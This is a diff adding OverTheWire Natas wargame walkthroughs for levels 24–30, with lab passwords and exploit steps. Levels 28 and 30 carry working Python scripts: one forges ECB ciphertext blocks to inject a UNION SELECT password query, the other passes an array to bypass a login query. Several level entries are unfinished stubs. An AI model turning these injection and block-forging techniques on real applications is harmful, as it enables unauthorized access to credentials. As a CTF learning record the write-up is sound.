@@ -900,6 +900,323 @@
   <img width="711" height="727" alt="image" src="https://github.com/user-attachments/assets/97088ea6-5cf4-427c-a5a3-6e82c790281f" />
 
 
+- ## Level-24
+- Username : natas24
+- Password : MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
+- Domain : http://natas24.natas.labs.overthewire.org
+- ## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas24.natas.labs.overthewire.org, Then login with username and password && check the source code
+- Step 2: Then we will enter 11iloveyou, then click login
+
+<img width="852" height="363" alt="image" src="https://github.com/user-attachments/assets/cba377a1-e294-4ec3-8361-d4b03e4f0c6a" />
+
+- Step 3: Then in search bar you will see the /?passwd=11iloveyou
+
+  <img width="868" height="400" alt="image" src="https://github.com/user-attachments/assets/5e3665e3-682b-4e03-9bce-8193439d5e99" />
+
+- Step 4: Then in that search bar we will use array []
+
+- Step 5: Then we will get the password for level-25
+
+  <img width="872" height="517" alt="image" src="https://github.com/user-attachments/assets/50a57e2b-c8fd-469e-833d-e0ce8725c6d2" />
+
+
+- ## Level-25
+- Username : natas25
+- Password : ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
+- Domain : http://natas25.natas.labs.overthewire.org
+- ## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas25.natas.labs.overthewire.org, Then login with username and password
+- Step 2: You will see the page like this
+
+  <img width="696" height="727" alt="image" src="https://github.com/user-attachments/assets/bfb45604-f76a-4981-9d4f-6b1a5c295a0f" />
+
+  - Step 3: Lets view the source code
+ 
+    <img width="820" height="702" alt="image" src="https://github.com/user-attachments/assets/0efec2a5-fb9c-4864-a78d-bc40182c37d2" />
+
+
+
+
+
+
+
+
+
+
+- ## Level-26
+- Username : natas26
+- Password : cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
+- Domain : http://natas26.natas.labs.overthewire.org
+- ## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas26.natas.labs.overthewire.org, Then login with username and password
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+## Level-27
+- Username : natas27
+- Password : u3RRffXjysjgwFU6b9xa23i6prmUsYne
+- Domain : http://natas27.natas.labs.overthewire.org
+## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas27.natas.labs.overthewire.org, Then login with username and password
+- Step 2: You will see the page like this && check source code
+
+  <img width="830" height="383" alt="image" src="https://github.com/user-attachments/assets/5a98c591-58a5-4f7b-a5f2-7eb5bf08b76b" />
+
+  - Step 3: Enter username and password it shows lik this
+ 
+    <img width="833" height="390" alt="image" src="https://github.com/user-attachments/assets/012f3597-e0d8-4a83-af4c-2070660d7446" />
+
+    <img width="841" height="306" alt="image" src="https://github.com/user-attachments/assets/12913bb3-7807-47e8-9692-8ed29eeff2e2" />
+
+  - Step 4: Then we will understand the process
+ 
+  -     It check the existing user or not
+        there is no existing user it is created new user
+        rejects usernames longer than 64  characters, return  false,
+
+        then new user created when new user created trims the usernname
+        trim removes all spaces from the front and back of the  string  
+
+        can not use only spaces to increases thhe length of the username so we will use only space it will show go away hacker 
+
+        so we add the charecter at end of the string 
+        new user created in dump data 
+        which ignore extra spaces to put end of the username
+
+        username and 64 spaces and end of charecter still shows in output without the spaces 
+
+        so we will use created extra username   
+
+        we will string heavy 1st 7 charecters is natas28, then we will have  57 wide spaces then complete 64 charecters we will have extra charecter like (x) of our choice 
+
+        then login then checks existing user or not so not user created then  it will show user grater than 64 charecters limit so it created new user trim  function will pass does not end with spaces and new user created . but we have limit is 64 charecyters that's why it removes end charecter 
+
+        dump function ignore the spaces natas 28 contents of natas28 is shows original existing
+
+  - Step 5: Then we will enter username and password , Then username: natas28 and 57 spaces and one extra charecter (x), looks like
+ 
+  -     natas28                                                         x
+ 
+    <img width="843" height="382" alt="image" src="https://github.com/user-attachments/assets/5150761e-e32c-4c66-ae3f-a345f84ba856" />
+
+  - Step 6: Then we will click on login button, it will show like this
+ 
+    <img width="837" height="307" alt="image" src="https://github.com/user-attachments/assets/bebf6f35-0bff-4021-be36-ad872e4d281a" />
+
+  - Step 7: Then it will create new user , then you will login same crediantials, but you will delete the end charecter (x), Because of more 64 not not exceed thats why it deletes automatically,Then dump function ignore the spaces
+
+- Step 8: Then you will get the password
+
+   <img width="835" height="371" alt="image" src="https://github.com/user-attachments/assets/62e6c45f-6415-4fc0-962e-c24d81a20435" />
+
+
+
+## Level-28
+- Username : natas28
+- Password : 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
+- Domain : http://natas28.natas.labs.overthewire.org
+## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas28.natas.labs.overthewire.org, Then login with username and password
+
+- Step 2: You will see the page like this
+
+  <img width="850" height="435" alt="image" src="https://github.com/user-attachments/assets/e98ccd76-29d2-46c0-939e-f0b8faddf55f" />
+- step 3: The application has no source code provided; when a user enters at least 3 characters in the search box, it displays 3 different jokes each time, even for the same search term.
+
+  <img width="838" height="431" alt="image" src="https://github.com/user-attachments/assets/08029ccd-1dec-4065-80a4-d5328f2732ec" />
+
+  <img width="1137" height="606" alt="image" src="https://github.com/user-attachments/assets/960dbd64-070d-48cc-b2cb-402bab2ad5ba" />
+
+- Step 4: If change that means delete perticular query, it will show like this
+
+  <img width="1117" height="571" alt="image" src="https://github.com/user-attachments/assets/d714363d-4887-4a72-9776-56237c3f886a" />
+
+  <img width="1122" height="360" alt="image" src="https://github.com/user-attachments/assets/b59f3ffe-f07f-4598-a4ad-1c691ccddeec" />
+
+- Step 5 (Simple Explanation):
+- PKCS#7 is a padding method used with block ciphers to encrypt data in fixed-size blocks.
+- When the same input data is encrypted multiple times, some encrypted blocks may look similar.
+- An attacker can compare these similar blocks across many queries to find patterns and help perform a brute-force attack.
+
+-      instead of stream cipher 
+      stream cipher, it chages some incryption , if you input same data mulyipile times , the number pf times you input the data what was before the data changes how the data getting incrypted
+
+- Step 6: It will structuted the padding like
+
+-     xxxxxxxxxxxx
+      xxxxxxxxxxxx
+      xxxx
+       xxxxx
+      xxxxxxxxxxxx
+      xxxxxxxxxxxx
+
+      we are trying to use sql injectiopn   
+
+      union mergers any two table , and merges all present in the database
+
+      find the num of bocks in our sql injection
+
+- Step 7: So, we will Write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
+-     import requests
+      import urllib.parse
+      import base64
+
+      url = "http://natas28.natas.labs.overthewire.org/index.php?lang="
+      search_url = "http://natas28.natas.labs.overthewire.org/search.php"
+
+      # --------------------------------------------------
+      # Create session with authentication
+      # --------------------------------------------------
+
+      s = requests.Session()
+      s.auth = ("natas28", "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj")
+
+       # --------------------------------------------------
+       # Step 1: Generate baseline for header and footer
+      # --------------------------------------------------
+
+      data = {
+       "query": 10 * " "
+      }
+
+      r = s.post(url, data=data)
+
+      baseline = urllib.parse.unquote(r.url.split("=")[1])
+      baseline = base64.b64decode(baseline.encode("utf-8"))
+  
+      header = baseline[:48]
+      footer = baseline[48:]
+
+      #  --------------------------------------------------
+      # Step 2: Generate ciphertext for SQL injection
+      # --------------------------------------------------
+
+       sqli = 9 * " " + "' UNION ALL SELECT password FROM users;#"
+
+      data = {
+       "query": sqli
+      }
+
+      r = s.post(url, data=data)
+
+      exploit = urllib.parse.unquote(r.url.split("=")[1])
+      exploit = base64.b64decode(exploit.encode("utf-8"))
+
+       # --------------------------------------------------
+      # Step 3: Calculate number of blocks
+      # --------------------------------------------------
+
+      nblocks = len(sqli) - 10
+      while nblocks % 16 != 0:
+          nblocks += 1
+
+      nblocks = nblocks // 16
+      
+      # --------------------------------------------------
+      # Step 4: Forge final ciphertext
+      # --------------------------------------------------
+      
+      final = header + exploit[48:(48 + 16 * (1 + nblocks))] + footer
+      final_ciphertext = base64.b64encode(final).decode()
+      
+      # --------------------------------------------------
+      # Step 5: Send forged request
+      # --------------------------------------------------
+      
+      resp = s.get(search_url, params={"query": final_ciphertext})
+      
+      print(resp.text)
+
+  - Step 8: After Run the code, we will get the password for Natas29
+ 
+    <img width="1108" height="510" alt="image" src="https://github.com/user-attachments/assets/65219dea-4033-4b70-aa5f-a7cf8b0baac4" />
+
+
+
+
+
+
+
+## Level-29
+- Username : natas29
+- Password : 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
+- Domain : http://natas29.natas.labs.overthewire.org
+ ## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas29.natas.labs.overthewire.org, Then login with username and password
+
+- 
+
+
+
+
+  ## Level-30
+- Username : natas30
+- Password : WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
+- Domain : http://natas30.natas.labs.overthewire.org
+## Explanation
+- Step 1: Go to Firefox Browser, Then Connect to natas30.natas.labs.overthewire.org, Then login with username and password
+
+- Step 2: You will see the page like this && check source code
+
+<img width="848" height="387" alt="image" src="https://github.com/user-attachments/assets/432e20ac-fae9-4921-862d-c01830c92f9a" />
+
+
+- Step 4: we WILL use sql injection
+
+- Step 5: So, we will Write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries,
+ we can't Run it online platform.
+
+      - import requests
+      
+      url = "http://natas30.natas.labs.overthewire.org"
+      
+      session = requests.Session()
+      session.auth = ("natas30", "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH")
+      
+      data = {
+          "username": "natas31", 
+          "password": ["' 'or 1", 2]
+      }
+      
+      resp = session.post(url, data=data)
+      print(resp.text)
+
+- Step 6: After Run the code, we will get the password for Natas31
+
+<img width="1123" height="482" alt="image" src="https://github.com/user-attachments/assets/55838913-728b-43f8-a556-67c9b92bd3a1" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
